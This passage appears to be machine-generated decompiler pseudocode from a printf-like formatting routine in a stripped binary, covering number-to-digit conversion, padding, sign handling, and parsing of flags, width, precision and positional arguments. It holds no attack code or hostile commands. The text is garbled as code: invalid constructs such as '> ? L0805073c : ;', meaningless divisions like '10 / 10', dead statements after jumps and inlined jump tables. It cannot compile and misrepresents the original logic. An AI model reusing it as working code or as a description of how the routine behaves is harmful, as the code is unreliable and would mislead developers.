                    eax = L08062714(Vfffffb64, Vfffffb68, ebp, ebx, 0);
                    esi = eax - 1;
                    if(Vfffffb84 != 0 && Vfffffba8 != 0) {
                        edx = Vfffffc08;
                        edi = Vfffffba8;
                        eax = L08052C9C(esi, & Vffffffff, edi, edx);
                        esi = eax;
                    }
                }
                edx = 0;
                if(Vfffffb64 != 0 || Vfffffb68 != 0) {
                    edx = 1;
                }
                Vfffffb64 = edx;
            } else {
                if(Vfffffb7c != 0) {
                    A10 = A10 + 4;
                    ecx = *(A10 - 4);
                    Vfffffb64 = ecx;
                } else {
                    A10 = A10 + 4;
                    ebx = *(A10 - 4);
                    Vfffffb64 = ebx;
                }
L080506c4:
                if(Vfffffb70 >= 0) {
                    Vfffffb6c = 32;
                    if(Vfffffb70 != 0 || Vfffffb64 != 0) {
                        goto L080506fa;
                    }
                    esi = & Vffffffff;
                } else {
                    Vfffffb70 = 1;
L080506fa:
                    edx = Vfffffb64;
                    eax = edx;
                    edx = ebp;
                    Vfffffb14 = "0123456789abcdefghijklmnopqrstuvwxyz";
                    if(Vfffffb60 == 88) {
                        Vfffffb14 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                    }
                    esi = edx;
                    if(Vfffffb10 != 10) {
                        > ? L0805073c : ;
                        if(Vfffffb10 == 8) {
                            goto L0805077c;
                        }
                        goto L08050794;
                        if(Vfffffb10 == 16) {
                            goto L08050764;
                        }
                    } else {
L08050748:
                        esi = esi - 1;
                        edx = 0;
                        edi = 10 / 10;
                        edx = edi % edi;
                        ecx = Vfffffb14;
                        dl = *(edx + ecx);
                        *esi = dl;
                        if(eax != 0) {
                            goto L08050748;
                        }
                        goto L080507ac;
L08050764:
                        esi = esi - 1;
                        ebx = Vfffffb14;
                        dl = *(edx + ebx);
                        *esi = dl;
                        eax = eax >> 4;
                        if(edx = eax & 15) {
                            goto L08050764;
                        }
                        goto L080507ac;
L0805077c:
                        esi = esi - 1;
                        edi = Vfffffb14;
                        dl = *(edx + edi);
                        *esi = dl;
                        eax = eax >> 3;
                        if(edx = eax & 7) {
                            goto L0805077c;
                        }
                        goto L080507ac;
                    }
L08050794:
                    esi = esi - 1;
                    edx = 0;
                    Vfffffb10 = Vfffffb10 / Vfffffb10;
                    edx = Vfffffb10 % Vfffffb10;
                    *esi = *(edx + Vfffffb14);
                    if(eax != 0) {
                        goto L08050794;
                    }
L080507ac:
                    esi = esi - 1;
                    if(Vfffffb84 != 0 && Vfffffba8 != 0) {
                        edx = Vfffffc08;
                        ebx = Vfffffba8;
                        eax = L08052C9C(esi, & Vffffffff, ebx, edx);
                        esi = eax;
                    }
                }
            }
            edx = !esi + ebp;
            Vfffffb74 = Vfffffb74 - edx;
            Vfffffb70 = Vfffffb70 - edx;
            if(Vfffffb64 != 0 && Vfffffb94 != 0 && Vfffffb10 == 8) {
                if(Vfffffb70 > 0) {
                    goto L08050825;
                }
                *esi = 48;
                esi = esi - 1;
                Vfffffb74 = Vfffffb74 - 1;
            }
            if(Vfffffb70 > 0) {
L08050825:
                edi = Vfffffb70;
                Vfffffb74 = Vfffffb74 - edi;
                edx = Vfffffb70;
                edi = edi - 1;
                Vfffffb70 = edi;
                if(edx > 0) {
L08050844:
                    *esi = 48;
                    esi = esi - 1;
                    edx = Vfffffb70;
                    Vfffffb70 = Vfffffb70 - 1;
                    if(edx > 0) {
                        goto L08050844;
                    }
                }
            }
            if(Vfffffb64 != 0 && Vfffffb94 != 0 && Vfffffb10 == 16) {
                Vfffffb74 = Vfffffb74 + -2;
            }
            if(Vfffffb78 != 0 || Vfffffb88 != 0 || Vfffffb90 != 0) {
                Vfffffb74 = Vfffffb74 - 1;
            }
            if(Vfffffb8c == 0 && Vfffffb6c == 48) {
                goto L080508b4;
L080508b0:
                *esi = 48;
                esi = esi - 1;
L080508b4:
                edx = Vfffffb74;
                Vfffffb74 = Vfffffb74 - 1;
                if(edx > 0) {
                    goto L080508b0;
                }
            }
            if(Vfffffb64 != 0 && Vfffffb94 != 0 && Vfffffb10 == 16) {
                *esi = Vfffffb60;
                esi = esi - 1;
                *esi = 48;
                esi = esi - 1;
            }
            if(Vfffffb78 != 0) {
                *esi = 45;
                goto L08050918;
            }
            if(Vfffffb88 != 0) {
                *esi = 43;
                goto L08050918;
            }
            if(Vfffffb90 != 0) {
                *esi = 32;
L08050918:
                esi = esi - 1;
            }
            if(Vfffffb8c == 0 && Vfffffb6c == 32) {
                goto L08050934;
L08050930:
                *esi = 32;
                esi = esi - 1;
L08050934:
                edx = Vfffffb74;
                Vfffffb74 = Vfffffb74 - 1;
                if(edx > 0) {
                    goto L08050930;
                }
            }
            ebx = *(A8 + 80);
            edi = !esi + ebp;
            edx = esi + 1;
            edx = *(ebx + 52);
            eax = *edx(A8, edx, edi);
            if(eax != edi) {
                goto L08050e72;
            }
            Vfffffb9c = Vfffffb9c + eax;
            goto L08050b07;
            ecx = Vfffffb70;
            Vfffffbcc = ecx;
            ebx = Vfffffb74;
            Vfffffbd0 = ebx;
            cl = Vfffffb60;
            Vfffffbd4 = cl;
            Vfffffbd8 = esi;
            ebx = Vfffffb80;
            Vfffffbdc = ebx;
            edi = Vfffffb7c;
            Vfffffbe0 = edi;
            ecx = Vfffffb94;
            Vfffffbe4 = ecx;
            ebx = Vfffffb90;
            Vfffffbe8 = ebx;
            edi = Vfffffb8c;
            Vfffffbec = edi;
            ecx = Vfffffb88;
            Vfffffbf0 = ecx;
            ebx = Vfffffb84;
            Vfffffbf4 = ebx;
            Vfffffbf8 = Vfffffb6c;
            eax = 0x8053310;
            if(esi != 0) {
                A10 = A10 + 12;
                ebx = A10;
                edx = *(ebx - 12);
                Vfffffc0c = edx;
                edx = *(ebx - 8);
                Vfffffc10 = edx;
                edx = *(ebx - 4);
                Vfffffc14 = edx;
            } else {
                A10 = A10 + 8;
                edi = A10;
                edx = *(edi - 8);
                Vfffffc0c = edx;
                edx = *(edi - 4);
                Vfffffc10 = edx;
            }
            Vfffffbc8 = & Vfffffc0c;
            edx = & Vfffffbc8;
            ebx = A8;
            eax = *eax(ebx, & Vfffffbcc, edx);
            if(eax < 0) {
                goto L08050e72;
            }
            Vfffffb9c = Vfffffb9c + eax;
            goto L08050dc4;
            Vfffffb74 = Vfffffb74 - 1;
            if(Vfffffb8c == 0 && Vfffffb74 > 0) {
                edi = Vfffffb74;
                L08062534(A8, 32, edi);
                Vfffffb9c = Vfffffb9c + eax;
            }
            A10 = A10 + 4;
            ebx = A10;
            eax = *(ebx - 4) & 255;
            edi = A8;
            edx = *(edi + 20);
            if(*(edi + 24) <= edx) {
                eax = L08061910(edi, al & 255);
                if(eax == -1) {
                    goto L08050e72;
                }
            } else {
                ecx = A8;
                edx = *(ecx + 20);
                Vfffffb28 = al;
                *edx = al;
                edx = Vfffffb28 & 255;
                *(ecx + 20) = *(ecx + 20) + 1;
                if(edx == -1) {
                    goto L08050e72;
                }
            }
            Vfffffb9c = Vfffffb9c + 1;
L08050b07:
            if(Vfffffb8c != 0 && Vfffffb74 > 0) {
                ebx = Vfffffb74;
                (save)ebx;
                (save)32;
                (save)A8;
                goto L08050c8f;
                A10 = A10 + 4;
                ecx = A10;
                esi = *(ecx - 4);
L08050b3e:
                if(esi == 0) {
                    if(Vfffffb70 == -1 || Vfffffb70 > 5) {
                        esi = "(null)";
                        Vfffffb10 = 6;
                    } else {
                        esi = 0x8067eeb;
                        Vfffffb10 = 0;
                    }
                } else {
                    if(Vfffffb70 != -1) {
                        goto L08050bdc;
                    }
                    al = 0;
                    edi = esi;
                    asm("cld");
                    ecx = -1;
                    asm("repne scasb");
                    edx = !ecx - 1;
                    Vfffffb10 = edx;
                    if(Vfffffb74 == 0) {
                        edi = A8;
                        edx = *(edi + 80);
                        eax = *( *(edx + 52))(edi, esi, Vfffffb10);
                        if(Vfffffb10 != eax) {
                            goto L08050e72;
                        }
                        ebx = Vfffffb10;
                        Vfffffb9c = Vfffffb9c + ebx;
                        goto L08050dc4;
L08050bdc:
                        ebx = Vfffffb70;
                        eax = L080575C0(esi, 0, ebx);
                        Vfffffb10 = ebx;
                        if(eax != 0) {
                            eax = eax - esi;
                            Vfffffb10 = eax;
                        }
                    }
                }
                edi = Vfffffb10;
                Vfffffb74 = Vfffffb74 - edi;
                if(Vfffffb8c == 0 && Vfffffb74 > 0) {
                    ebx = A8;
                    eax = L08062534(ebx, 32, Vfffffb74);
                    Vfffffb9c = Vfffffb9c + eax;
                }
                edi = A8;
                edx = *(edi + 80);
                eax = *( *(edx + 52))(edi, esi, Vfffffb10);
                if(Vfffffb10 != eax) {
                    goto L08050e72;
                }
                ebx = Vfffffb10;
                Vfffffb9c = Vfffffb9c + ebx;
                if(Vfffffb8c != 0 && Vfffffb74 > 0) {
                    edi = Vfffffb74;
                    (save)edi;
                    (save)32;
                    (save)A8;
L08050c8f:
                    eax = L08062534();
                    Vfffffb9c = Vfffffb9c + eax;
                    esp = esp + 12;
                    goto L08050dc4;
                    A10 = A10 + 4;
                    ebx = A10;
                    edx = *(ebx - 4);
                    if(edx != 0) {
                        Vfffffb10 = 16;
                        Vfffffb64 = edx;
                        Vfffffb78 = 0;
                        Vfffffb94 = 1;
                        Vfffffb84 = 0;
                        Vfffffb60 = 120;
                        goto L080506c4;
                    }
                    esi = "(nil)";
                    if(Vfffffb70 > 4) {
                        goto L08050b3e;
                    }
                    Vfffffb70 = 5;
                    goto L08050b3e;
                    if(esi != 0) {
                        A10 = A10 + 4;
                        edi = A10;
                        eax = *(edi - 4);
                        ecx = Vfffffb9c;
                        ebx = 0;
                        Vfffffb20 = ecx;
                        Vfffffb24 = 0;
                        ebx = Vfffffb20;
                        *eax = ebx;
                        ebx = Vfffffb24;
                        *(eax + 4) = ebx;
                    } else {
                        if(Vfffffb7c != 0) {
                            A10 = A10 + 4;
                            edi = A10;
                            edx = *(edi - 4);
                            ecx = Vfffffb9c;
                            *edx = ecx;
                        } else {
                            if(Vfffffb80 == 0) {
                                A10 = A10 + 4;
                                ebx = A10;
                                edx = *(ebx - 4);
                                edi = Vfffffb9c;
                                *edx = edi;
                            } else {
                                A10 = A10 + 4;
                                edx = *(A10 - 4);
                                *edx = Vfffffb9c;
                                goto L08050dc4;
                                edx = & Vfffffc18;
                                eax = L08056E14( *L08078B14, edx, 1000);
                                esi = eax;
                                goto L08050b3e;
                            }
                        }
                    }
                }
            }
L08050dc4:
            Vfffffc00 = Vfffffc00 + 1;
            esi = Vfffffc00;
            Vfffffb10 = esi;
            if(*esi != 0) {
L08050ddc:
                edi = Vfffffb10;
                if(*edi != 37) {
                    if(*edi < 0) {
                        eax = L0805602C(0, edi, 1);
                        if(eax > 0) {
                            goto L08050e08;
                        }
                    }
                    Vfffffb10 = Vfffffb10 + 1;
                    goto L08050e0e;
L08050e08:
                    Vfffffb10 = Vfffffb10 + eax;
L08050e0e:
                    ecx = Vfffffb10;
                    if(*ecx != 0) {
                        goto L08050ddc;
                    }
                }
            }
            ebx = Vfffffb10;
            Vfffffc00 = ebx;
            edx = Vfffffc00 - esi;
            edx = *( *(A8 + 80) + 52);
            eax = *edx(A8, esi, edx);
            edx = Vfffffc00 - esi;
            if(eax != edx) {
                goto L08050e72;
            }
            Vfffffb9c = Vfffffb9c + eax;
            edx = Vfffffc00;
            if(*edx != 0) {
                goto L0804f9ac;
            }
            goto L080529b8;
        }
    }
    *L08078B14 = 22;
L08050e72:
    eax = -1;
    goto L080529be;
L08050e7c:
    Vfffffb58 = 32;
    esp = esp + -2816;
    Vfffffb54 = esp;
    Vfffffb5c = 0;
    Vfffffb50 = 0;
    Vfffffbc4 = 0;
    if(Vfffffba8 == -1) {
        edx = *( *L08078890 + 16);
        Vfffffb20 = edx;
        al = 0;
        esi = Vfffffb20;
        edi = esi;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        edx = !ecx - 1;
        if(L0805602C( & Vfffffc08, Vfffffb20, edx) <= 0) {
            edx = *( *( *L08078890 + 16)) & 255;
            Vfffffc08 = edx;
        }
        edx = *( *L08078890 + 20);
        Vfffffba8 = edx;
        if(*edx == 0 || *edx == 255) {
            goto L08050f2e;
        }
        if(Vfffffc08 == 0) {
L08050f2e:
            Vfffffba8 = 0;
        }
    }
    ebx = Vfffffba4;
    Vfffffc00 = ebx;
    if(*ebx != 0) {
        edi = Vfffffb5c;
        edx = edi + (edi + edi * 4) * 2 << 3;
        Vfffffb2c = edx;
L08050f64:
        ecx = Vfffffb58;
        if(Vfffffb5c >= ecx) {
            esi = Vfffffb54;
            ecx = ecx + ecx;
            Vfffffb58 = ecx;
            edx = ecx + (ecx + ecx * 4) * 2 << 3;
            esp = esp - edx;
            Vfffffb54 = esp;
            edx = Vfffffb2c + esi;
            if(esp == edx) {
                Vfffffb58 = ecx + (ecx >> 1);
            } else {
                ebx = Vfffffb2c;
                edi = Vfffffb54;
                eax = L0805652C(edi, esi, ebx);
                edx = Vfffffb54 + ebx;
                if(esi == edx) {
                    edx = Vfffffb58 >> 1;
                    Vfffffb58 = Vfffffb58 + edx;
                }
            }
        }
        ecx = Vfffffb50;
        Vfffffb48 = ecx;
        esi = Vfffffb2c + Vfffffb54;
        edx = Vfffffc00;
        Vfffffbb0 = edx;
        Vfffffb44 = 0;
        Vfffffbb0 = Vfffffbb0 + 1;
        *(esi + 64) = -1;
        *(esi + 24) = 0;
        *(esi + 28) = 0;
        *(esi + 32) = 0;
        *(esi + 36) = 0;
        *(esi + 40) = 0;
        *(esi + 44) = 32;
        edx = Vfffffbb0;
        eax = *edx & 255;
        ebx = *L08078FA0;
        Vfffffb10 = ebx;
        if(!( *(ebx + eax * 2 + 1) & 8)) {
            Vfffffb40 = edx;
            edi = & Vfffffbb0;
            Vfffffb14 = edi;
            eax = eax + -48;
            Vfffffbb0 = Vfffffbb0 + 1;
            edx = *Vfffffbb0 & 255;
            if(!( *(ebx + edx * 2 + 1) & 8)) {
L0805108c:
                edx = eax + eax * 8 + eax - 48;
                Vfffffb20 = edx;
                ecx = Vfffffb14;
                edx = *( *ecx) & 255;
                eax = Vfffffb20 + edx;
                *ecx = *ecx + 1;
                edx = *( *ecx) & 255;
                Vfffffb20 = edx;
                edx = *L08078FA0;
                ebx = Vfffffb20;
                if(*(edx + ebx * 2 + 1) & 8) {
                    goto L0805108c;
                }
            }
            if(eax != 0) {
                edx = Vfffffbb0;
                if(*edx == 36) {
                    Vfffffbb0 = Vfffffbb0 + 1;
                    edi = eax - 1;
                    *(esi + 64) = edi;
                    edx = Vfffffbc4;
                    if(edx < eax) {
                        edx = eax;
                    }
                    Vfffffbc4 = edx;
                    goto L080511bb;
                }
            }
            ecx = Vfffffb40;
            Vfffffbb0 = ecx;
            goto L080511bb;
L08051114:
            edx = ( *Vfffffbb0 & 255) + -32;
            Vfffffbb0 = Vfffffbb0 + 1;
            if(edx <= 16) {
                goto *(edx * 4 + 0x8051138)[L0805117c, L080511bb, L080511bb, L080511a0, L080511bb, L080511bb, L080511bb, L080511b4, L080511bb, L080511bb, L080511bb, L08051188, L080511bb, L08051194, L080511bb, L080511bb, L080511ac, ]goto ( *(edx * 4 + 0x8051138));
                *(esi + 28) = 1;
                goto L080511bb;
                *(esi + 36) = 1;
                goto L080511bb;
                *(esi + 32) = 1;
                goto L080511bb;
                *(esi + 24) = 1;
                goto L080511bb;
                *(esi + 44) = 48;
                goto L080511bb;
                *(esi + 40) = 1;
            }
        }
L080511bb:
        edx = Vfffffbb0;
        if(*edx == 32 || *edx == 43 || *edx == 45 || *edx == 35 || *edx == 48 || *edx == 39) {
            goto L08051114;
        }
        if(*(esi + 32) != 0) {
            *(esi + 44) = 32;
        }
        *(esi + 60) = -1;
        *(esi + 4) = 0;
        edx = Vfffffbb0;
        if(*edx == 42) {
            Vfffffbb0 = Vfffffbb0 + 1;
            ebx = Vfffffbb0;
            Vfffffb10 = ebx;
            edx = *ebx & 255;
            edi = *L08078FA0;
            Vfffffb20 = edi;
            if(!( *(edi + edx * 2 + 1) & 8)) {
                ecx = & Vfffffbb0;
                Vfffffb14 = ecx;
                eax = edx - 48;
                Vfffffbb0 = Vfffffbb0 + 1;
                edx = *Vfffffbb0 & 255;
                if(!( *(edi + edx * 2 + 1) & 8)) {
L08051270:
                    edx = eax + eax * 8 + eax - 48;
                    Vfffffb20 = edx;
                    ebx = Vfffffb14;
                    edx = *( *ebx) & 255;
                    eax = Vfffffb20 + edx;
                    *ebx = *ebx + 1;
                    edx = *( *ebx) & 255;
                    Vfffffb20 = edx;
                    edx = *L08078FA0;
                    edi = Vfffffb20;
                    if(*(edx + edi * 2 + 1) & 8) {
                        goto L08051270;
                    }
                }
                if(eax != 0) {
                    edx = Vfffffbb0;
                    if(*edx == 36) {
                        ecx = eax - 1;
                        *(esi + 60) = ecx;
                        edx = Vfffffbc4;
                        if(edx < eax) {
                            edx = eax;
                        }
                        Vfffffbc4 = edx;
                        Vfffffbb0 = Vfffffbb0 + 1;
                    }
                }
            }
            if(*(esi + 60) < 0) {
                ebx = Vfffffb48;
                *(esi + 60) = ebx;
                ebx = *(esi + 60) + 1;
                Vfffffb48 = ebx;
                Vfffffb44 = Vfffffb44 + 1;
                edi = Vfffffb10;
                Vfffffbb0 = edi;
            }
        } else {
            edx = *Vfffffbb0 & 255;
            ecx = *L08078FA0;
            Vfffffb10 = ecx;
            if(!( *(ecx + edx * 2 + 1) & 8)) {
                ebx = & Vfffffbb0;
                Vfffffb14 = ebx;
                eax = edx - 48;
                Vfffffbb0 = Vfffffbb0 + 1;
                edx = *Vfffffbb0 & 255;
                if(!( *(ecx + edx * 2 + 1) & 8)) {
L08051354:
                    edx = eax + eax * 8 + eax - 48;
                    Vfffffb20 = edx;
                    edi = Vfffffb14;
                    edx = *( *edi) & 255;
                    eax = Vfffffb20 + edx;
                    *edi = *edi + 1;
                    edx = *( *edi) & 255;
                    Vfffffb20 = edx;
                    edx = *L08078FA0;
                    ecx = Vfffffb20;
                    if(*(edx + ecx * 2 + 1) & 8) {
                        goto L08051354;
                    }
                }
                *(esi + 4) = eax;
            }
        }
        *(esi + 56) = -1;
        *esi = -1;
        edx = Vfffffbb0;
        if(*edx == 46) {
            Vfffffbb0 = Vfffffbb0 + 1;
            edx = Vfffffbb0;
            if(*edx != 42) {
                goto L080514bc;
            }
            Vfffffbb0 = Vfffffbb0 + 1;
            ebx = Vfffffbb0;
            Vfffffb10 = ebx;
            edx = *ebx & 255;
            edi = *L08078FA0;
            Vfffffb20 = edi;
            if(!( *(edi + edx * 2 + 1) & 8)) {
                ecx = & Vfffffbb0;
                Vfffffb14 = ecx;
                eax = edx - 48;
                Vfffffbb0 = Vfffffbb0 + 1;
                edx = *Vfffffbb0 & 255;
                if(!( *(edi + edx * 2 + 1) & 8)) {
L0805141c:
                    edx = eax + eax * 8 + eax - 48;
                    Vfffffb20 = edx;
                    ebx = Vfffffb14;
                    edx = *( *ebx) & 255;
                    eax = Vfffffb20 + edx;
                    *ebx = *ebx + 1;
                    edx = *( *ebx) & 255;
                    Vfffffb20 = edx;
                    edx = *L08078FA0;
                    edi = Vfffffb20;
                    if(*(edx + edi * 2 + 1) & 8) {
                        goto L0805141c;
                    }
                }
                if(eax != 0) {
                    edx = Vfffffbb0;
                    if(*edx == 36) {
                        ecx = eax - 1;
                        *(esi + 56) = ecx;
                        edx = Vfffffbc4;
                        if(edx < eax) {
                            edx = eax;
                        }
                        Vfffffbc4 = edx;
                        Vfffffbb0 = Vfffffbb0 + 1;
                    }
                }
            }
            if(*(esi + 56) < 0) {
                ebx = Vfffffb48;
                *(esi + 56) = ebx;
                ebx = *(esi + 56) + 1;
                Vfffffb48 = ebx;
                Vfffffb44 = Vfffffb44 + 1;
                edi = Vfffffb10;
                Vfffffbb0 = edi;
                goto L0805154a;
L080514bc:
                edx = *Vfffffbb0 & 255;
                ecx = *L08078FA0;
                Vfffffb10 = ecx;
                if(!( *(ecx + edx * 2 + 1) & 8)) {
                    Vfffffb14 = & Vfffffbb0;
                    eax = edx - 48;
                    Vfffffbb0 = Vfffffbb0 + 1;
                    edx = *Vfffffbb0 & 255;
                    if(!( *(ecx + edx * 2 + 1) & 8)) {
L08051500:
                        edx = eax + eax * 8 + eax - 48;
                        Vfffffb20 = edx;
                        edi = Vfffffb14;
                        edx = *( *edi) & 255;
                        eax = Vfffffb20 + edx;
                        *edi = *edi + 1;
                        edx = *( *edi) & 255;
                        Vfffffb20 = edx;
                        edx = *L08078FA0;
                        if(*(edx + Vfffffb20 * 2 + 1) & 8) {
                            goto L08051500;
                        }
                    }
                    *esi = eax;
                } else {
                    *esi = 0;
                }
            }
        }
L0805154a:
        *(esi + 12) = 0;
        *(esi + 16) = 0;
        *(esi + 20) = 0;
        goto L08051653;
L08051564:
        edx = ( *Vfffffbb0 & 255) + -76;
        Vfffffbb0 = Vfffffbb0 + 1;
        if(edx <= 37) {
            goto *(edx * 4 + 0x8051588)[L0805164c, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L0805163c, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051653, L08051620, L08051653, L08051653, L08051653, L0805162c, L08051653...]goto ( *(edx * 4 + 0x8051588));
            *(esi + 16) = 1;
            goto L08051653;
            if(*(esi + 20) == 0) {
                *(esi + 20) = 1;
                goto L08051653;
                *(esi + 12) = 0;
                *(esi + 20) = 0;
            } else {
                *(esi + 12) = 1;
            }
        }
L08051653:
        edx = Vfffffbb0;
        if(*edx == 104 || *edx == 108 || *edx == 76 || *edx == 90 || *edx == 113) {
            goto L08051564;
        }
        edx = Vfffffbb0;
        *(esi + 8) = *edx;
        Vfffffbb0 = Vfffffbb0 + 1;
        eax = *(esi + 8) & 255;
        if(*(eax * 4 + 0x807e78c) != 0) {
            edx = esi + 68;
            edx = *(eax * 4 + 0x807e78c);
            *edx(esi, 1, edx);
            *(esi + 72) = eax;
        } else {
            *(esi + 72) = 1;
            edx = ( *(esi + 8) & 255) + -69;
            if(edx <= 51) {
                goto *(edx * 4 + 0x80516e0)[L080517f0, L0805183c, L080517f0, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L080517b0, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805183c, L0805180c, L080517b0, L080517f0, L080517f0...]goto ( *(edx * 4 + 0x80516e0));
                if(*(esi + 12) == 0) {
                    goto L080517c4;
                }
                *(esi + 68) = 256;
                goto L08051843;
                if(*(esi + 20) != 0) {
                    *(esi + 68) = 512;
                } else {
                    if(*(esi + 16) != 0) {
                        *(esi + 68) = 1024;
                    } else {
                        *(esi + 68) = 0;
                        goto L08051843;
                        if(*(esi + 12) != 0) {
                            *(esi + 68) = 261;
                        } else {
                            *(esi + 68) = 5;
                            goto L08051843;
                            *(esi + 68) = 1;
                            goto L08051843;
                            *(esi + 68) = 2;
                            goto L08051843;
                            *(esi + 68) = 3;
                            goto L08051843;
                            *(esi + 68) = 2048;
                        }
                    }
                }
            } else {
                *(esi + 72) = 0;
            }
        }
L08051843:
        if(*(esi + 64) == -1 && *(esi + 72) != 0) {
            *(esi + 64) = Vfffffb48;
            Vfffffb44 = Vfffffb44 + *(esi + 72);
        }
        if(*(esi + 8) == 0) {
            edx = Vfffffbb0 - 1;
            *(esi + 52) = edx;
            *(esi + 48) = *(esi + 52);
        } else {
            edx = Vfffffbb0;
            *(esi + 48) = edx;
            Vfffffb10 = edx;
            if(*Vfffffb10 != 0) {
L0805188c:
                ecx = Vfffffb10;
                if(*ecx != 37) {
                    if(*ecx < 0) {
                        eax = L0805602C(0, ecx, 1);
                        if(eax > 0) {
                            goto L080518b8;
                        }
                    }
                    Vfffffb10 = Vfffffb10 + 1;
                    goto L080518be;
L080518b8:
                    Vfffffb10 = Vfffffb10 + eax;
L080518be:
                    if(*Vfffffb10 != 0) {
                        goto L0805188c;
                    }
                }
            }
            *(esi + 52) = Vfffffb10;
        }
        Vfffffb50 = Vfffffb50 + Vfffffb44;
        ebx = Vfffffb2c;
        edx = *(Vfffffb54 + ebx + 52);
        Vfffffc00 = edx;
        Vfffffb2c = ebx + 88;
        Vfffffb5c = Vfffffb5c + 1;
        if(*Vfffffc00 != 0) {
            goto L08050f64;
        }
    }
    edx = Vfffffbc4;
    eax = Vfffffb50;
    if(eax < edx) {
        eax = edx;
    }
    Vfffffb50 = eax;
    edx = eax * 4;
    Vfffffb20 = edx;
    esp = esp - edx;
    esi = esp;
    eax = L08057764(esi, 0, edx);
    esp = esp - (Vfffffb50 + Vfffffb50 * 2 << 2);
    Vfffffb4c = esp;
    if(Vfffffb5c != 0) {
        Vfffffb10 = Vfffffb54;
        Vfffffb14 = 0;
L08051978:
        edi = Vfffffb14;
        ecx = Vfffffb54;
        if(*(ecx + edi + 60) != -1) {
            *(esi + *(ecx + edi + 60) * 4) = 0;
        }
        ebx = Vfffffb14;
        edi = Vfffffb54;
        if(*(edi + ebx + 56) != -1) {
            *(esi + *(edi + ebx + 56) * 4) = 0;
        }
        ecx = Vfffffb14;
        ebx = Vfffffb54;
        edx = *(ebx + ecx + 72);
        if(edx != 0) {
            if(edx == 1) {
                edi = *(ebx + ecx + 64);
                *(esi + edi * 4) = *(ebx + ecx + 68);
            } else {
                ebx = Vfffffb54;
                Vfffffb20 = *(ebx + Vfffffb14 + 8) & 255;
                eax = *( *(Vfffffb20 * 4 + 0x807e78c))(Vfffffb10, *(ebx + Vfffffb14 + 72), *(ebx + Vfffffb14 + 64) * 4 + esi);
            }
        }
        Vfffffb10 = Vfffffb10 + 88;
        Vfffffb14 = Vfffffb14 + 88;
        ecx = Vfffffb5c;
        if(Vfffffb14 != ecx + (ecx + ecx * 4) * 2 << 3) {
            goto L08051978;
        }
    }
    Vfffffb10 = 0;
    A10 = Vfffffb98;
    if(Vfffffb10 < Vfffffb50) {
        eax = Vfffffb4c;
L08051a80:
        edx = *esi;
        if(edx != 4) {
            > ? L08051abc : ;
            if(edx != 1) {
                > ? L08051aa4 : ;
                if(edx == 0) {
                    goto L08051b78;
                }
                goto L08051b98;
                if(edx == 2) {
                    goto L08051b78;
                }
                if(edx == 3) {
                    goto L08051b88;
                }
                goto L08051b98;
                if(edx == 261) {
                    goto L08051b5c;
                }
                > ? L08051adc : ;
                if(edx == 5) {
                    goto L08051b48;
                }
                if(edx == 256) {
                    goto L08051b20;
                }
                goto L08051b98;
                if(edx == 512) {
                    goto L08051b88;
                }
                if(edx == 1024) {
                    goto L08051b0c;
                }
                goto L08051b98;
            }
            A10 = A10 + 4;
            *eax = *(A10 - 4);
            goto L08051bc0;
L08051b0c:
            A10 = A10 + 4;
            *eax = *(A10 - 4);
            goto L08051bc0;
L08051b20:
            A10 = A10 + 8;
            ebx = A10;
            *eax = *(ebx - 8);
            *(eax + 4) = *(ebx - 4);
        } else {
            A10 = A10 + 8;
            *eax = *(A10 - 8);
            goto L08051bc0;
L08051b48:
            A10 = A10 + 8;
            ecx = A10;
            *eax = *(ecx - 8);
            *(eax + 4) = *(ecx - 4);
            goto L08051bc0;
L08051b5c:
            A10 = A10 + 12;
            ebx = A10;
            *eax = *(ebx - 12);
            *(eax + 4) = *(ebx - 8);
            *(eax + 8) = *(ebx - 4);
            goto L08051bc0;
L08051b78:
            A10 = A10 + 4;
            *eax = *(A10 - 4);
            goto L08051bc0;
L08051b88:
            A10 = A10 + 4;
            *eax = *(A10 - 4);
            goto L08051bc0;
L08051b98:
            if(!( *(esi + 1) & 8)) {
                A10 = A10 + 4;
                *eax = *(A10 - 4);
            } else {
                *eax = 0;
                *(eax + 4) = 0;
                *(eax + 8) = 0;
            }
        }
L08051bc0:
        eax = eax + 12;
        esi = esi + 4;
        Vfffffb10 = Vfffffb10 + 1;
        if(Vfffffb10 < Vfffffb50) {
            goto L08051a80;
        }
    }
    if(Vfffffba0 < Vfffffb5c) {
        Vfffffb30 = Vfffffba0 + (Vfffffba0 + Vfffffba0 * 4) * 2 << 3;
L08051c08:
        edi = Vfffffb30;
        ecx = Vfffffb54;
        if(*(ecx + edi + 60) != -1) {
            edx = *(ecx + edi + 60) + *(ecx + edi + 60) * 2;
            edx = *(Vfffffb4c + edx * 4);
            *(ecx + edi + 4) = edx;
            if(edx < 0) {
                *(ecx + edi + 4) = ~edx;
                *(ecx + edi + 32) = 1;
            }
        }
        edi = Vfffffb30;
        ecx = Vfffffb54;
        if(*(ecx + edi + 56) != -1) {
            edx = *(ecx + edi + 56) + *(ecx + edi + 56) * 2;
            edx = *(Vfffffb4c + edx * 4);
            *(ecx + edi) = edx;
            if(*(ecx + edi) < 0) {
                *(ecx + edi) = -1;
            }
        }
        edx = ( *(Vfffffb54 + Vfffffb30 + 8) & 255) + -37;
        if(edx <= 83) {
            goto *(edx * 4 + 0x8051c98)[L08051de8, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L0805287c, L08052480, L0805287c...]goto ( *(edx * 4 + 0x8051c98));
            ebx = A8;
            if(*(ebx + 24) <= *(ebx + 20)) {
                if(L08061910(ebx, 37) == -1) {
                    goto L08050e72;
                }
            } else {
                edi = A8;
                *( *(edi + 20)) = 37;
                *(edi + 20) = *(edi + 20) + 1;
            }
            Vfffffb9c = Vfffffb9c + 1;
            goto L08052933;
